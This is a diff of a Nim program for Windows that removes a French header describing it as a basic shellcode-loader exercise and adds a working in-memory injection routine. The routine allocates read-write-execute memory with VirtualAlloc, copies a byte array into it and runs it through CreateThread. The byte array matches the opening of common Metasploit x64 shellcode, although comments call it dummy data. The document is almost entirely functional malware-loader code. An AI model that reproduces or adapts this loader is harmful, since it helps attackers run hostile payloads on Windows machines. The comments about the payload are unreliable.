@@ -1,22 +1,37 @@
-
-
-# Exercice 1 - Chargeur de shellcode de base
-# Langage : Nim
-# Objectif : démontrer l'exécution de code en mémoire sous windows
-# Ce programme ne contient aucune persistance ni mécanisme d'évasion
+import winim/lean
  
 when defined(windows):
   echo "loader initialisé"
 else:
   echo "Ce programme est prévu pour Windows uniquement"
-
+ 
 echo "loader prêt"
-
-# Données factives, pas de shellcode
-var payload = [byte 0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
-               0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
-               0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,
-               0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9]
-
-
+ 
+var payload = [byte 0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00] # 8 bytes factices
+ 
 echo "taille payload = ", payload.len
+ 
+proc injectLocal[I, T](shellcode: var array[I, T]): void =
+  let executable_memory = VirtualAlloc(
+    nil,
+    len(shellcode),
+    MEM_COMMIT,
+    PAGE_EXECUTE_READ_WRITE
+  )
+  copyMem(executable_memory, shellcode[0].addr, len(shellcode))
+  let tHandle = CreateThread(
+    nil,
+    0,
+    cast[LPTHREAD_START_ROUTINE](executable_memory),
+    nil,
+    0,
+    cast[LPDWORD](0)
+  )
+  defer: CloseHandle(tHandle)
+  discard WaitForSingleObject(tHandle, -1)
+ 
+proc main =
+  injectLocal(payload)
+ 
+when isMainModule:
+  main()
